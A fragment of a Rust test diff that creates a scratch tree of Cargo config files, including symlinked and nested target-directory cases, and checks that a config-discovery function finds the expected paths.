+            "b/c/.cargo/config",
+            "[source.crates-io]\nreplace-with = \"m\"\n",
+        ),
+    ] {
+        let path = scratch.path().join(relative);
+        fs::create_dir_all(path.parent().expect("parent")).expect("mkdir");
+        fs::write(&path, content).expect("write");
+    }
+    // A symlinked .cargo, a config below a nested `target`, and one in the
+    // skipped root build directory.
+    fs::create_dir_all(scratch.path().join("elsewhere")).expect("mkdir");
+    fs::write(scratch.path().join("elsewhere/config.toml"), "").expect("write");
+    fs::create_dir_all(scratch.path().join("d")).expect("mkdir");
+    std::os::unix::fs::symlink(
+        scratch.path().join("elsewhere"),
+        scratch.path().join("d/.cargo"),
+    )
+    .expect("symlink");
+    fs::create_dir_all(scratch.path().join("e/target/.cargo")).expect("mkdir");
+    fs::write(scratch.path().join("e/target/.cargo/config"), "").expect("write");
+    fs::create_dir_all(scratch.path().join("target/.cargo")).expect("mkdir");
+    fs::write(scratch.path().join("target/.cargo/config.toml"), "").expect("write");
+    let mut found = cargo_configs(scratch.path(), &[scratch.path().join("target")]);
+    found.sort();
+    assert_eq!(
+        found,
+        vec![
+            scratch.path().join("a/.cargo/config.toml"),
+            scratch.path().join("b/c/.cargo/config"),
+            scratch.path().join("d/.cargo/config.toml"),
+            scratch.path().join("e/target/.cargo/config"),
+        ]
+    );
 }
 
 #[test]
